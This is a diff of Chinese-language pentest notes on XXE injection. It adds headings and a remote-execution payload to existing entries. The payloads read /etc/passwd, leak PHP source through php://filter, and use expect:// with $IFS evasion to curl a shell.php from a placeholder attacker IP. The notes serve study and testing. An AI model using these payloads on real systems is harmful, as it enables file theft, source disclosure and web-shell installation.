@@ -88,14 +88,19 @@ Comments注释  <!-- 和 -->
 即使一个 Web 应用程序以 JSON 格式发送请求，我们也可以尝试将 Content-Type 标头更改为 application/xml，然后使用在线工具将 JSON 数据转换为 XML
 
 Injection:
+  读文件
   <!DOCTYPE email [
     <!ENTITY company SYSTEM "file:///etc/passwd">
   ]>
-
   在某些 Java Web 应用程序中，我们或许还可以指定一个目录而不是文件，这样我们会得到一个目录列表，这对于定位敏感文件很有用
 
+  看代码
   <!DOCTYPE email [
     <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
   ]>
-
   Burp 右侧窗格中的 Inspector 选项卡，它就会向我们显示解码后的文件
+
+  远程执行
+  <!DOCTYPE email [
+    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+  ]>
